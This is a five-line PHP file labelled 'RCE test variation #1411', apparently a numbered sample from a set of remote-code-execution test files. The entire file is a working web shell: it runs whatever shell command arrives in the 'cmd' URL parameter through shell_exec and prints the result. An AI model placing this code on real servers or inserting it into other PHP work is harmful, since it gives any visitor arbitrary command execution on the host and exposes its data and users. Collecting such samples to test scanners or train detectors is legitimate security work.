<?php
// RCE test variation #1411
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>